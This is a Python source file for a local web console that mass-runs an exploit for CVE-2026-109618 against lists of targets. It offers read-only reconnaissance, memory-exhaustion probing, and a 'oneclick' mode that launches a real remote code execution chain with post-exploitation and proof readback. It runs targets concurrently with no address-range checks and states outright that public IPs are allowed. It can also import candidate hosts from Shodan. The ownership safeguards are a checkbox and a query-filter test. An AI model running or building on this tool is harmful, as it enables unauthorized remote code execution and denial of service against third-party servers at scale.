#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-109618 batch assessment console (local web GUI, zero third-party dependencies)

Usage:
    python3 gui/server.py --host 127.0.0.1 --port 8899
    open http://127.0.0.1:8899 in a browser

Design notes:
- This tool does **only CVE-2026-109618**: it contains no generic web scanning such as SQLi/XSS/CSRF/LFI/command injection;
- The only engine is attack/p2s_ext.py; each target runs in its own subprocess (crash/timeout isolation) and concurrency is configurable;
- Two modes:
    recon     four-precondition triage (version/sink/post_max>memory_limit/heap calibratable), read-only by default;
              OOM impact probing is sent only when "Deep probing" is checked (up to 16MB body, may return 5xx);
    oneclick  real RCE chain (also requires "Confirm attack execution"): Stage-1/2 leak + fake HashTable +
              short command execution + HTTP readback of proof; results come from oneclick_report.json;
- No address-range validation is performed: pasted targets go straight into the queue, public IPs can be used directly;
- All results are written to gui_runs/<job_id>/ and can be exported as JSON / CSV.
"""
import argparse
import csv
import io
import ipaddress
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
P2S = os.path.join(ROOT, "attack", "p2s_ext.py")
PY = sys.executable or "python3"

def _max_workers():
    """GUI concurrency cap: environment variable P2S_MAX_WORKERS (default 32, hard cap 64)."""
    try:
        n = int(os.environ.get("P2S_MAX_WORKERS", "32") or 32)
    except ValueError:
        n = 32
    return max(1, min(64, n))
STATIC = os.path.join(HERE, "static")
WORKROOT = os.environ.get("WS_GUI_WORK") or os.path.join(os.getcwd(), "gui_runs")

JOBS = {}
JOBS_LOCK = threading.Lock()
SEV_ORDER = ["critical", "high", "medium", "low", "info"]


def load_snapshot(jid):
    """Keep past jobs visible after a restart: read them from gui_runs/<job_id>/report.json"""
    if not re.match(r"^[\w.-]+$", jid or ""):
        return None
    p = os.path.join(WORKROOT, jid, "report.json")
    if not os.path.isfile(p):
        return None
    try:
        with io.open(p, encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None



# ------------------------------------------------------------------ helpers
def _host_of(target):
    """Extract the bare hostname or IP from a URL / host:port / [v6]:port"""
    t = (target or "").strip()
    if "://" in t:
        t = t.split("://", 1)[1]
    t = t.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
    if "@" in t:
        t = t.rsplit("@", 1)[1]
    if t.startswith("["):
        return t[1:].split("]", 1)[0]
    if t.count(":") == 1:
        h, _, port = t.partition(":")
        if port.isdigit():
            return h
    return t


def is_public_host(host):
    """Public-host test: anything that is not loopback/private/link-local counts as public"""
    if not host:
        return False
    h = _host_of(host).strip("[]").lower()
    if h in ("localhost", "localhost.localdomain"):
        return False
    try:
        ips = [h] if re.match(r"^[\d.]+$", h) or ":" in h else []
        if not ips:
            ips = [socket.gethostbyname(h)]
    except Exception:
        # If parsing fails, treat it as public (more conservative)
        return True
    for ip in ips:
        try:
            a = ipaddress.ip_address(ip)
        except ValueError:
            return True
        if not a.is_global:  # loopback/private/link-local/reserved/documentation (TEST-NET) are all treated as non-public
            return False
    return True


def normalize_target(raw):
    t = (raw or "").strip()
    if not t or t.startswith("#"):
        return None
    if "://" not in t:
        t = "http://" + t
    # A bare IPv6 address must be bracketed, otherwise urlparse treats the first segment as host and the rest as port
    try:
        rest = t.split("://", 1)[1]
        authority = re.split(r"[/?#]", rest, 1)[0]
        if authority.count(":") >= 2 and not authority.startswith("["):
            ipaddress.ip_address(authority)  # only IPv6 gets here
            t = t.replace(authority, "[%s]" % authority, 1)
    except ValueError:
        pass
    return t


def cve_verdict(rc, mode):
    """Map a CLI exit code to a CVE-2026-109618-specific verdict."""
    if mode == "oneclick":
        return {0: "RCE_CONFIRMED", 10: "RCE_LIKELY", 20: "DOS_ONLY", 30: "NOT_AFFECTED",
                40: "NO_SINK", 50: "UNREACHABLE", 3: "DENIED"}.get(rc, "UNKNOWN")
    return {0: "AFFECTED", 10: "RCE_LIKELY", 15: "UNKNOWN_VERSION", 20: "DOS_ONLY",
            30: "NOT_AFFECTED", 40: "NO_SINK", 50: "UNREACHABLE", 3: "DENIED"}.get(rc, "UNKNOWN")


def cve_status(rc):
    return {0: "found", 10: "likely", 20: "dos", 15: "unknown", 30: "clean",
            40: "clean", 3: "denied", 50: "error"}.get(rc, "error")


def cve_severity(rc):
    return {0: "critical", 10: "high", 20: "low"}.get(rc, "info")


def synth_cve(log, rc, url, mode, report, err):
    """Turn a recon/oneclick JSON report or exit code into a GUI target record."""
    report = report if isinstance(report, dict) else {}
    verdict = report.get("verdict") or cve_verdict(rc, mode)
    ver = report.get("php_version") or report.get("version") or ""
    if isinstance(ver, dict):
        ver = ver.get("version") or ""
    sink = report.get("sink") or (report.get("sinks") or [None])[0] or ""
    pre = report.get("precondition") or {}
    ev = {
        "mode": mode, "verdict": verdict, "version": str(ver or ""),
        "sink": str(sink or ""),
        "profile": report.get("profile") or report.get("profile_source") or "",
        "rce": bool(report.get("rce")),
        "proof_body": (report.get("proof_body") or "")[:400],
        "proof_url": report.get("proof_url") or "",
        "postex_rc": report.get("postex_rc"),
        "steps": report.get("steps") or [],
        "report_error": err,
    }
    if isinstance(pre, dict):
        ev["post_max_gt_memory"] = pre.get("post_max_gt_memory_limit", pre.get("post_max_size_gt_memory_limit"))
        ev["oom_at_mb"] = pre.get("oom_at_mb")
        ev["post_max_hit_mb"] = pre.get("post_max_hit_mb")
    elif isinstance(report.get("deep"), dict):
        d = report["deep"]
        ev["post_max_gt_memory"] = d.get("post_max_gt_memory_limit", d.get("post_max_size_gt_memory_limit"))
        ev["oom_at_mb"] = d.get("oom_at_mb")
        ev["post_max_hit_mb"] = d.get("post_max_hit_mb")
    desc = "[%s] %s → %s (exit %s)" % (mode, url, verdict, rc)
    if ev["version"]:
        desc += "; PHP %s" % ev["version"]
    if ev.get("oom_at_mb") is not None:
        desc += "; OOM@%sMB" % ev["oom_at_mb"]
    if ev.get("post_max_gt_memory"):
        desc += "; post_max>memory_limit"
    if ev["proof_body"]:
        desc += "; proof=%s" % ev["proof_body"].replace("\n", " ")[:120]
    finding = {
        "type": "cve-2026-109618",
        "title": "CVE-2026-109618 %s" % verdict,
        "severity": cve_severity(rc),
        "url": url,
        "mode": mode,
        "verdict": verdict,
        "version": ev["version"],
        "detail": desc,
    }
    tgt = {"status": cve_status(rc), "rc": rc, "summary": desc,
           "findings": [finding] if rc in (0, 10) else [],
           "evidence": ev, "verdict": verdict, "log": log[-20000:]}
    if verdict == "NO_SESSION_SINK":
        tgt["status"] = "no_sink"
    elif verdict == "UNKNOWN_PRECOND":
        tgt["status"] = "unknown"
    return tgt


def safe_name(url, i):
    h = urlparse(url).hostname or "host"
    p = urlparse(url).port
    base = re.sub(r"[^A-Za-z0-9_.-]", "_", "%s%s" % (h, ("_%s" % p) if p else ""))
    return "%02d_%s" % (i, base[:60])


# ------------------------------------------------------------------ Job
class Job(object):
    def __init__(self, targets, opts):
        self.id = time.strftime("%Y%m%d-%H%M%S-") + uuid.uuid4().hex[:6]
        self.dir = os.path.join(WORKROOT, self.id)
        os.makedirs(self.dir, exist_ok=True)
        self.created = time.time()
        self.opts = opts
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.done = 0
        self.total = 0
        self.status = "running"
        self.targets = []
        for i, raw in enumerate(targets):
            self.targets.append({
                "idx": i, "raw": raw, "url": raw, "host": "",
                "public": False, "status": "queued", "rc": None,
                "started": None, "ended": None, "duration": None,
                "findings": [], "summary": {}, "error": "", "log": "",
                "fingerprint": None, "out": None,
            })
        self.total = len(self.targets)
        self._t0 = time.time()

    # ---- per-target execution
    def _run_one(self, tgt):
        if self.stop_flag.is_set():
            with self.lock:
                tgt["status"] = "stopped"
            return
        raw = tgt["raw"]
        url = normalize_target(raw)
        if not url:
            with self.lock:
                tgt["status"] = "skipped"
                tgt["error"] = "blank line/comment"
            return
        host = (urlparse(url).hostname or "").lower()
        pub = is_public_host(host)
        with self.lock:
            tgt["url"], tgt["host"], tgt["public"] = url, host, pub
            tgt["started"] = time.time()
            tgt["status"] = "running"

        o = self.opts
        mode = (o.get("mode") or "recon").lower()
        if mode not in ("recon", "oneclick"):
            mode = "recon"
        name = safe_name(url, tgt["idx"])
        log_path = os.path.join(self.dir, name + ".log")
        args = ["-u", url]
        if o.get("insecure"):
            args.append("--insecure")
        if o.get("timeout"):
            args += ["--timeout", str(o["timeout"])]
        py = [PY, str(P2S)]
        if mode == "recon":
            report_path = os.path.join(self.dir, name + ".recon.json")
            cmd = py + ["recon"] + args + ["--json"]
            if o.get("fast"):
                # Fast first pass: check home page version + 2 sinks only, about 3 requests
                cmd.append("--fast")
            elif o.get("deep"):
                cmd += ["--deep", "--budget", str(o.get("budget") or 6),
                        "--delay", str(o.get("delay") if o.get("delay") is not None else 0.3)]
                if o.get("probe_sizes"):
                    cmd += ["--probe-sizes", str(o["probe_sizes"])]
        else:
            outdir = os.path.join(self.dir, "oc_" + name)
            report_path = os.path.join(outdir, "oneclick_report.json")
            cmd = py + ["oneclick"] + args + [
                "--http-read", url,
                "--rounds", str(o.get("rounds") or 6),
                "--tries", str(o.get("tries") or 2),
                "--force", "--postex",
                "--only", str(o.get("only") or "id"),
                "--outdir", outdir,
            ]
        _pt = int(o.get("per_target_timeout") or 900)
        rc, log = self._exec(cmd, log_path, _pt)
        if "[TIMEOUT]" in log:
            # The subprocess was killed by the per-target timeout; the report file usually does not exist yet;
            # do not show FileNotFoundError as a "report error" any more.
            return {
                "status": "error", "rc": 2, "verdict": "TIMEOUT",
                "summary": "[%s] %s → TIMEOUT (exceeded %ss, process terminated, no report generated)"
                           % (mode, url, _pt),
                "findings": [],
                "evidence": {"mode": mode, "verdict": "TIMEOUT",
                             "timeout_s": _pt, "report_error": ""},
                "log": log[-20000:],
            }
        report, perr = self._load_report(report_path, log)
        return synth_cve(log, rc, url, mode, report, perr)

    def _load_report(self, path, log):
        """Prefer the report file; if that fails, extract the last JSON object from stdout."""
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f), ""
        except Exception as e:
            err = "%s: %s" % (type(e).__name__, e)
        i, j = log.find("{"), log.rfind("}")
        if 0 <= i < j:
            try:
                return json.loads(log[i:j + 1]), ""
            except Exception as e2:
                err += " / stdout JSON parse failed: %s" % e2
        return None, err

    def _exec(self, cmd, log_path, timeout):
        try:
            p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                               timeout=timeout, cwd=ROOT)
            out = (p.stdout or b"").decode("utf-8", "replace")
            rc = p.returncode
        except subprocess.TimeoutExpired as e:
            out = ((e.stdout or b"").decode("utf-8", "replace")
                   + "\n[TIMEOUT] exceeded %ss, terminated" % timeout)
            rc = 2
        except Exception as e:
            out, rc = "[EXEC ERROR] %s" % e, 2
        with io.open(log_path, "a", encoding="utf-8") as f:
            f.write(out)
        return rc, out

    def run(self):
        # Concurrency cap is configurable: P2S_MAX_WORKERS (default 16, hard cap 64), so a hard-coded 8 does not slow down large batches
        workers = max(1, min(_max_workers(), int(self.opts.get("concurrency", 8))))
        print("[job] workers=%d targets=%d mode=%s" % (workers, len(self.targets), self.opts.get("mode")), flush=True)
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(self._run_one, t): i for i, t in enumerate(self.targets)}
                for fut in as_completed(futs):
                    i = futs[fut]
                    try:
                        res = fut.result()
                    except Exception as e:
                        with self.lock:
                            self.targets[i]["status"] = "error"
                            self.targets[i]["error"] = "%s: %s" % (type(e).__name__, e)
                        continue
                    if isinstance(res, dict):
                        with self.lock:
                            self.targets[i].update(res)
        finally:
            self.status = "stopped" if self.stop_flag.is_set() else "done"
            with io.open(os.path.join(self.dir, "report.json"), "w", encoding="utf-8") as f:
                json.dump(self.snapshot(), f, ensure_ascii=False, indent=1)

    def stop(self):
        self.stop_flag.set()

    # ---- snapshot
    def snapshot(self, with_log=True):
        sev = {k: 0 for k in SEV_ORDER}
        types = {}
        for t in self.targets:
            for f in t["findings"]:
                s = (f.get("severity") or "info").lower()
                sev[s] = sev.get(s, 0) + 1
                types[f.get("type", "?")] = types.get(f.get("type", "?"), 0) + 1
        tg = []
        for t in self.targets:
            d = dict(t)
            if not with_log:
                d.pop("log", None)
            else:
                d["log"] = t.get("log", "")[-1500:]
            d["counts"] = {k: sum(1 for f in t["findings"]
                                  if (f.get("severity") or "info").lower() == k) for k in SEV_ORDER}
            tg.append(d)
        return {
            "job_id": self.id, "status": self.status,
            "created": self.created, "elapsed": round(time.time() - self._t0, 1),
            "opts": {k: v for k, v in self.opts.items()},
            "total": self.total,
            "done": sum(1 for t in self.targets
                        if t["status"] in ("found", "clean", "error", "denied", "skipped", "stopped")),
            "severity": sev, "types": types, "targets": tg,
        }


# ------------------------------------------------------------------ HTTP
class Handler(BaseHTTPRequestHandler):
    server_version = "WS-GUI/1.0"

    def log_message(self, fmt, *args):
        pass

    # ---- helpers
    def _send(self, code, body, ctype="application/json; charset=utf-8", extra=None):
        if isinstance(body, (dict, list)):
            body = json.dumps(body, ensure_ascii=False).encode("utf-8")
        elif isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _static(self, rel):
        path = os.path.normpath(os.path.join(STATIC, rel))
        if not path.startswith(STATIC) or not os.path.isfile(path):
            return self._send(404, {"error": "not found"})
        ctype = {"html": "text/html; charset=utf-8", "js": "application/javascript; charset=utf-8",
                 "css": "text/css; charset=utf-8", "svg": "image/svg+xml"}.get(
            path.rsplit(".", 1)[-1], "application/octet-stream")
        with open(path, "rb") as f:
            self._send(200, f.read(), ctype)

    def _body(self):
        n = int(self.headers.get("Content-Length") or 0)
        if n <= 0:
            return {}
        try:
            return json.loads(self.rfile.read(n).decode("utf-8"))
        except Exception:
            return {}

    # ---- routes
    def do_GET(self):
        p = urlparse(self.path).path
        if p in ("/", "/index.html"):
            return self._static("index.html")
        if p.startswith("/static/"):
            return self._static(p[len("/static/"):])
        if p == "/api/jobs":
            items = []
            try:
                names = [d for d in os.listdir(WORKROOT)
                         if os.path.isfile(os.path.join(WORKROOT, d, "report.json"))]
            except Exception:
                names = []
            names.sort(key=lambda d: os.path.getmtime(os.path.join(WORKROOT, d, "report.json")), reverse=True)
            for jid in names[:20]:
                snap = load_snapshot(jid) or {}
                items.append({"job_id": jid, "status": snap.get("status"),
                              "total": snap.get("total"), "created": snap.get("created")})
            return self._send(200, {"jobs": items, "workroot": WORKROOT})
        if p == "/api/health":
            return self._send(200, {"ok": True, "jobs": len(JOBS)})
        m = re.match(r"^/api/job/([^/]+)(?:/([\w.]+))?$", p)
        if m:
            jid, act = m.group(1), m.group(2)
            job = JOBS.get(jid)
            snap = job.snapshot() if job else load_snapshot(jid)
            if not snap:
                return self._send(404, {"error": "job not found"})
            if act in ("export.json", "export.csv", "export"):
                return self._export(snap, jid, act)
            return self._send(200, snap)
        return self._send(404, {"error": "not found"})

    def do_POST(self):
        p = urlparse(self.path).path
        if p == "/api/scan":
            return self._start()
        if p == "/api/import/shodan":
            return self._shodan_import()
        m = re.match(r"^/api/job/([^/]+)/stop$", p)
        if m:
            job = JOBS.get(m.group(1))
            if not job:
                return self._send(404, {"error": "job not found"})
            job.stop()
            return self._send(200, {"ok": True, "job_id": job.id})
        return self._send(404, {"error": "not found"})

    _SELF_SCOPE_RE = re.compile(r"\b(?:net|org|hostname|asn):", re.I)

    def _shodan_import(self):
        """Import "own asset" candidate targets from Shodan.

        The query is required to carry a net:/org:/hostname:/asn: qualifier, so a public search engine
        cannot become a batch attack entry point for "picking third-party victims across the internet"; the import result is only a candidate list,
        and scanning still needs your explicit action (it is never queued automatically).
        """
        b = self._body()
        key = (b.get("api_key") or os.environ.get("SHODAN_API_KEY") or "").strip()
        q = (b.get("query") or "").strip()
        stats_only = bool(b.get("stats_only"))
        try:
            limit = int(b.get("limit") or 50)
        except Exception:
            limit = 50
        limit = max(1, min(200, limit))
        if not q:
            return self._send(400, {"error": 'query is required, e.g. net:203.0.113.0/24 or org:"your company name"'})
        # Importing a target list must be limited to own assets; stats_only returns aggregate counts only and produces no IPs, so any query is allowed
        if not stats_only and not self._SELF_SCOPE_RE.search(q):
            return self._send(400, {
                "error": 'Shodan search must be limited to own assets: include a net:/org:/hostname:/asn: filter. '
                         'This tool does not provide the ability to "automatically pick third-party hosts with RCE across the internet". '
                         'If you only want to see the distribution of a fingerprint, check "statistics only (no IPs returned)".',
                "query": q})
        if not key:
            return self._send(400, {"error": "Missing Shodan API key (you can also export SHODAN_API_KEY=...)"})
        if b.get("dry_run"):
            return self._send(200, {"dry_run": True, "query": q,
                                    "limit": limit, "stats_only": stats_only})
        try:
            import sys as _sys
            ad = os.path.join(ROOT, "attack")
            if ad not in _sys.path:
                _sys.path.insert(0, ad)
            from discover import shodan_search, shodan_count
            if stats_only:
                stats, err = shodan_count(key, q, timeout=25)
            else:
                pages = max(1, min(5, (limit + 99) // 100))
                matches, err = shodan_search(key, q, pages=pages, timeout=25)
        except Exception as e:
            return self._send(502, {"error": "Shodan query error: %s" % e})
        if err:
            return self._send(502, {"error": "Shodan query failed: %s" % err})
        if stats_only:
            # Return aggregate counts only, never host addresses
            return self._send(200, {"query": q, "stats_only": True,
                                    "total": (stats or {}).get("total", 0),
                                    "facets": (stats or {}).get("facets", {}),
                                    "note": "statistics mode returns no IPs/ports; it is only for understanding fingerprint distribution"})
        rows, seen = [], set()
        for m in matches or []:
            ip = m.get("ip") or m.get("ip_str")
            if not ip:
                continue
            port = m.get("port")
            t = "%s:%s" % (ip, port) if port else str(ip)
            if t in seen:
                continue
            seen.add(t)
            prod = (m.get("product") or "").strip()
            ver = (m.get("version") or "").strip()
            rows.append({"target": t, "ip": ip, "port": port,
                         "hint": (prod + " " + ver).strip(),
                         "country": m.get("country_code") or ""})
            if len(rows) >= limit:
                break
        return self._send(200, {"query": q, "count": len(rows),
                                "targets": [r["target"] for r in rows], "rows": rows})

    def _start(self):
        b = self._body()
        raw_targets = b.get("targets") or []
        if isinstance(raw_targets, str):
            raw_targets = re.split(r"[\r\n,;]+", raw_targets)
        targets = [t.strip() for t in raw_targets if t and t.strip() and not t.strip().startswith("#")]
        if not targets:
            return self._send(400, {"error": "target list is empty"})
        # Target count is unlimited by default (0/unset = unlimited); set P2S_MAX_TARGETS to rate-limit
        targets = list(dict.fromkeys(targets))  # deduplicate, keep input order
        try:
            max_targets = int(os.environ.get("P2S_MAX_TARGETS", "0") or 0)
        except ValueError:
            max_targets = 0
        if max_targets > 0 and len(targets) > max_targets:
            return self._send(400, {"error": "at most %d targets per request (P2S_MAX_TARGETS can be adjusted), please split the batch" % max_targets,
                                    "target_count": len(targets)})
        mode = (b.get("mode") or "recon").lower()
        if mode not in ("recon", "oneclick"):
            mode = "recon"
        attack_ack = bool(b.get("attack_ack"))
        if mode == "oneclick" and not attack_ack:
            return self._send(400, {"error": "oneclick really launches RCE exploitation; check \"I confirm attack execution (generate/read back proof)\""})
        opts = {
            "mode": mode,
            "attack_ack": attack_ack,
            "fast": bool(b.get("fast")),
            "deep": bool(b.get("deep")) and not bool(b.get("fast")),
            "budget": max(1, min(8, int(b.get("budget") or 6))),
            "probe_sizes": (b.get("probe_sizes") or "0.5,1,2,4,8,16").strip(),
            "rounds": max(1, min(20, int(b.get("rounds") or 6))),
            "tries": max(1, min(5, int(b.get("tries") or 2))),
            "only": (b.get("only") or "id").strip()[:200],
            "concurrency": max(1, min(_max_workers(), int(b.get("concurrency") or 16))),
            "timeout": max(3, min(120, int(b.get("timeout") or 20))),
            "delay": max(0.0, min(10.0, float(b.get("delay") if b.get("delay") is not None else 0.3))),
            "insecure": bool(b.get("insecure")),
            "per_target_timeout": max(60, min(7200, int(b.get("per_target_timeout") or 1800))),
        }
        job = Job(targets, opts)
        with JOBS_LOCK:
            JOBS[job.id] = job
        threading.Thread(target=job.run, daemon=True).start()
        return self._send(200, {"job_id": job.id, "total": job.total})

    def _export(self, snap, jid, kind):
        if kind == "export.csv" or kind == "export":
            buf = io.StringIO()
            w = csv.writer(buf)
            w.writerow(["target", "host", "public", "status", "rc", "duration_s",
                        "severity", "type", "url", "parameter", "evidence", "detail"])
            for t in snap["targets"]:
                if not t["findings"]:
                    w.writerow([t["url"], t["host"], t["public"], t["status"], t["rc"],
                                t["duration"], "", "", "", "", "", t.get("error", "")])
                for f in t["findings"]:
                    w.writerow([t["url"], t["host"], t["public"], t["status"], t["rc"],
                                t["duration"], f.get("severity"), f.get("type"),
                                f.get("url"), f.get("param"), (f.get("evidence") or "")[:500],
                                (f.get("detail") or "")[:500]])
            data = buf.getvalue().encode("utf-8-sig")
            return self._send(200, data, "text/csv; charset=utf-8",
                              {"Content-Disposition": 'attachment; filename="%s.csv"' % jid})
        data = json.dumps(snap, ensure_ascii=False, indent=1).encode("utf-8")
        return self._send(200, data, "application/json; charset=utf-8",
                          {"Content-Disposition": 'attachment; filename="%s.json"' % jid})


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 batch fingerprint and read-only assessment GUI console")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8899)
    a = ap.parse_args()
    os.makedirs(WORKROOT, exist_ok=True)
    if not os.path.isfile(P2S):
        sys.exit("cannot find attack/p2s_ext.py; run from the toolkit root")
    try:
        srv = ThreadingHTTPServer((a.host, a.port), Handler)
    except OSError as e:
        sys.exit("failed to bind port %d (%s). Try another port: --port 8899" % (a.port, e))
    print("CVE-2026-109618 assessment GUI: http://%s:%d" % (a.host, a.port))
    print("Results directory: %s" % WORKROOT)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
